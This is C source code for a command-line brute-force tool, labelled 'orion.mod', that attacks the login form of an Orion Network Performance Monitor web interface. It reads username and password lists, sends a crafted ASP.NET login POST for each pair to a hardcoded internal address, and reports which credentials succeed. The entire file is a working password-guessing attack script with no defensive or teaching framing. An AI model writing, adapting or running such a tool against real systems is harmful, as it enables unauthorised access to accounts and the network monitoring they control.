#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#define MODULE_NAME "orion.mod"
#define MODULE_AUTHOR "Cloogo <wang691234@gmail.com>"
#define MODULE_SUMMARY_USAGE "Brute force module for Orion Network Performance Monitor"
#define MODULE_VERSION "1.2"
#define MODULE_SUMARY_FORMATE "%s : version %s"

#define ACCOUNT_BUF 0
#define PW_BUF 1

void showUsage();
int connectTCP(const char*ip,const char*port);
int discard(int sock,size_t sz);
char* fmap(char*filename,size_t* sz);
char* genGETStr();
char* genPOSTStr(char*username,char*pw);
size_t getBodyLen(char*head);
char* getLineFrmStr(char**cnt,int type);
int isCracked(char*body);
int nextAttempPair(char*pwf,char**cur_acf,char**cur_pwf,char**cur_ac,char**cur_pw);
int attempReport(char*cur_ac,char*cur_pw,int isCracked);
char* peekLine(int sock);
char* peekStr(int sock,size_t sz);
char* peekUntil(int sock,char* sym);
int requestGET(int sock,const char*cnt);
int requestPOST(int sock,const char*cnt);
char* responseHEAD(int sock);
char* responseBODY(int sock,size_t sz);
int responseGET200(int sock);

int main(int argc,char** argv){
    if(argc!=3){
        showUsage();
    }
    srand(time(NULL));
    int sock=connectTCP("192.168.253.22","2010");
    if(sock==-1){
        perror("socket");
        exit(1);
    }
    char* acfn=argv[1];
    char* pwfn=argv[2];
    size_t acsz=0,pwsz=0;
    char* acf=fmap(acfn,&acsz);
    char* pwf=fmap(pwfn,&pwsz);
    char* cur_acf=acf,*cur_pwf=pwf;
    char* head,*body=head=NULL;
    char* cur_ac=getLineFrmStr(&cur_acf,ACCOUNT_BUF);
    char* cur_pw=getLineFrmStr(&cur_pwf,PW_BUF);
#ifdef TEST_PAIR
    while(printf("%s:%s\n",cur_ac,cur_pw),nextAttempPair(pwf,&cur_acf,&cur_pwf,&cur_ac,&cur_pw));
#endif
    while(requestGET(sock,genGETStr())&&responseGET200(sock)&&
          requestPOST(sock,genPOSTStr(cur_ac,cur_pw))&&
          !attempReport(cur_ac,cur_pw,isCracked(body=responseBODY(sock,getBodyLen(head=responseHEAD(sock)))))&&
          nextAttempPair(pwf,&cur_acf,&cur_pwf,&cur_ac,&cur_pw)){
//        printf("%s%s",head,body);
        free(body);
        free(head);
    }
cleanup:
    {
        close(sock);
        munmap(acf,acsz);
        munmap(pwf,pwsz);
    }
    return 0;
}

void showUsage(){
  printf("%s (%s) %s :: %s\n", MODULE_NAME, MODULE_VERSION, MODULE_AUTHOR, MODULE_SUMMARY_USAGE);
  printf("\n\n");
  printf("Usage:./orion Userlist Pwlist\n");
  exit(1);
}

int nextAttempPair(char*pwf,char**cur_acf,char**cur_pwf,char**cur_ac,char**cur_pw){
    *cur_pw=getLineFrmStr(cur_pwf,PW_BUF);
    if(*cur_pw==NULL){
        *cur_ac=getLineFrmStr(cur_acf,ACCOUNT_BUF);
        if(*cur_ac==NULL){
            return 0;
        }
        *cur_pwf=pwf;
        *cur_pw=getLineFrmStr(cur_pwf,PW_BUF);
    }
    return 1;
}

char* fmap(char* filename,size_t*sz){
    int fd=open(filename,O_RDONLY);
    struct stat fs;
    fstat(fd,&fs);
    *sz=fs.st_size;
    char* ptr=mmap(NULL,*sz,PROT_READ,MAP_PRIVATE,fd,0);
    close(fd);
    return ptr;
}

int connectTCP(const char* ip,const char* port){
    int sfd=socket(AF_INET,SOCK_STREAM,0);
    if(sfd==-1){
        return -1;
    }
    struct in_addr ipaddr;
    if(inet_aton(ip,&ipaddr)==0){
        return -1;
    }
    struct sockaddr_in s_addr;
    memset(&s_addr,0,sizeof(s_addr));
    s_addr.sin_family=AF_INET;
    s_addr.sin_addr=ipaddr;
    s_addr.sin_port=htons(atoi(port));
    if(connect(sfd,(struct sockaddr*)&s_addr,sizeof(s_addr))==-1){
        return -1;
    }
    return sfd;
}

char* genGETStr(){
    return (char*){
        "GET /Orion/Login.aspx?ReturnUrl=%2forion%2fproxy.aspx%3fpath%3d%2f&path=%2f HTTP/1.1\r\n"
        "Host: 192.168.253:22:2010\r\n"
        "Connection: keep-alive\r\n"
        "Cache-Control: max-age=0\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "User-Agent: \r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        "Accept-Encoding: gzip, deflate, sdch\r\n"
        "Accept-Language: en-US,en;q=0.8\r\n"
        "Cookie: ASP.NET_SessionId=; JSESSIONID=; TestCookieSupport=Supported\r\n"
        "\r\n\0"
    };
}

char* genPOSTStr(char* username,char* pw){
    static char ps[4096];
    memset(ps,0,4096);
    char head[1024]={'\0'};
    char body[3072]={'\0'};
    sprintf(body,
        "__EVENTTARGET=&"
        "__EVENTARGUMENT=&"
        "__VIEWSTATE=%%2FwEPDwUJNTYxOTY1NDU4D2QWAmYPZBYCAgMPZBYEAgcPZBYCAgEPZBYCAgUPFgIeB1Zpc2libGVoZAILDxYCHwBoZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUlY3RsMDAkQ29udGVudFBsYWNlSG9sZGVyMSRMb2dpbkJ1dHRvbjvmZrWZ2XDxXEN%2BN7FDx9YgkjoY&"
        "ctl00%%24ContentPlaceHolder1%%24Username=%s&"
        "ctl00%%24ContentPlaceHolder1%%24Password=%s&"
        "ctl00%%24ContentPlaceHolder1%%24LoginButton.x=%d&"
        "ctl00%%24ContentPlaceHolder1%%24LoginButton.y=%d",
        username,
        pw,
        random()%100,
        random()%10);
    sprintf(head,
        "POST /Orion/Login.aspx?ReturnUrl=%%2forion%%2fproxy.aspx%%3fpath%%3d%%2f&path=%%2f HTTP/1.1\r\n"
        "Host: 192.168.253.22:2010\r\n"
        "Connection: keep-alive\r\n"
        "Content-Length: %d\r\n"
        "Cache-Control: max-age=0\r\n"
        "Origin: http://192.168.253.22:2010\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "User-Agent:\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        "Referer: http://192.168.253.22:2010/Orion/Login.aspx?ReturnUrl=%%2forion%%2fproxy.aspx%%3fpath%%3d%%2f&path=%%2f\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Accept-Language: en-US,en;q=0.8\r\n"
        "Cookie: ASP.NET_SessionId=; JSESSIONID=; TestCookieSupport=Supported\r\n"
        "\r\n\0",
        strlen(body));
    strcat(ps,head);
    strcat(ps,body);
    return ps;
}

int requestGET(int sock,const char* cnt){
    return write(sock,cnt,strlen(cnt));
}

int requestPOST(int sock,const char* cnt){
    return write(sock,cnt,strlen(cnt));
}

char* peekLine(int sock){
    size_t len=512;
    char* str=malloc(len),*ptr=str;
    memset(str,0,len);
    size_t sz=0;
    while(read(sock,ptr,1)>0){
        sz++;
        if(sz>=len){
            str=realloc(str,2*len);
            ptr=str+sz;
            len*=2;
        }
        if(*ptr=='\n'){
            *ptr='\0';
            break;
        }
        ptr++;
    }
    return str;
}

char* peekUntil(int sock,char* sym){
    size_t slen=strlen(sym);
    char buf[slen],*bptr=buf;
    memset(buf,0,slen);
    size_t len=512;
    char* str=malloc(len),*ptr=str;
    memset(str,0,len);
    size_t sz=0;
    while(read(sock,ptr,1)>0){
        sz++;
        *bptr++=*ptr++;
        if(sz>=len){
            str=realloc(str,2*len);
            ptr=str+sz;
            len*=2;
        }
        if(bptr-buf>=slen){
            bptr=buf;
        }
        size_t llen=slen-(bptr-buf);
        size_t rlen=slen-llen;
        if(sz<=slen){
            if(sz!=slen)continue;
            if(strncmp(buf,sym,slen)==0){
                break;
            }
        }else if(strncmp(bptr,sym,llen)==0&&strncmp(buf,sym+llen,rlen)==0){
//            printf("l=(%*s) r=(%*s)\n",llen,bptr,rlen,buf);
            break;
        }
    }
    *ptr='\0';
//    printf("peekUntil(%s)=\"%s\"\n",sym,str);
    return str;
}

char* peekStr(int sock,size_t sz){
    assert(sz>=0);
    char* str=malloc(sz+1),*ptr=str;
    memset(str,0,sz);
    size_t rs=0;
    while(read(sock,ptr,1)>0){
        rs++;
        ptr++;
        if(rs==sz){
            break;
        }
    }
    *ptr='\0';
//    printf("peekStr:[[%s]]\n",str);
//    printf("peekStr:len=%d\n",rs);
    return str;
}

int discard(int sock,size_t sz){
//    printf("\n\n[Discard]:\n");
    char c;
    size_t si=0;
    while(read(sock,&c,1)>0){
        si++;
        if(si==sz){
            break;
        }
     //   putc(c,stdout);
    }
    return si;
}

int responseGET200(int sock){
    char* get200="HTTP/1.1 200 OK\r\n";
    char* head=responseHEAD(sock);
    size_t len=getBodyLen(head);
    if(discard(sock,len)==len){
        if(strncmp(head,get200,strlen(get200))==0){
            return 1;
        }
    }
    return 0;
}

size_t getBodyLen(char* head){
    size_t len=0;
    char* cntls="Content-Length:";
    char* cntlp=strstr(head,cntls);
    if(cntlp!=NULL){
        while(*cntlp++==' ');
        len=atoi(cntlp+strlen(cntls));
    }
//    printf("getBodyLen()=%d\n",len);
    return len;
}

char* responseHEAD(int sock){
    return peekUntil(sock,"\r\n\r\n");
}

char* responseBODY(int sock,size_t sz){
    return peekStr(sock,sz);
}

char* getLineFrmStr(char** cnt,int type){
    static char ac[128];
    static char pw[128];
    char* line=NULL;
    if(type==ACCOUNT_BUF){
        line=ac;
    }else{
        line=pw;
    }
    char* str=*cnt;
    char* end=strchr(str,'\n');
    if(end==NULL){
        return NULL;
    }
    snprintf(line,end-str+1,"%s",str);
    *cnt=*cnt+(end-str)+1;
//    printf("getLineFrmStr()=\"%s\"\n",line);
    return line;
}

int isCracked(char* body){
//    printf("[DEBUG[%s]]\n\n",body);
    return (strstr(body,"Login failure")==NULL&&strstr(body,"User Name is required.")==NULL&&printf("[DEBUG[%s]]\n\n",body));
}

int attempReport(char* ac,char* pw,int isCracked){
    static int counter=0;
    counter++;
    printf("[%21d] tryLogin %021s\t:%021s\t%s\n",counter,ac,pw,isCracked?"\e[0;37mCracked\e[0m":"\e[0;36mFailed\e[0m");
    if(isCracked){
        printf("\n\n");
        printf("\e[0;37m\t[Found]:\taccount=\"%s\"\tpassword=\"%s\"\e[0m\n",ac,pw);
    }
    return isCracked;
}
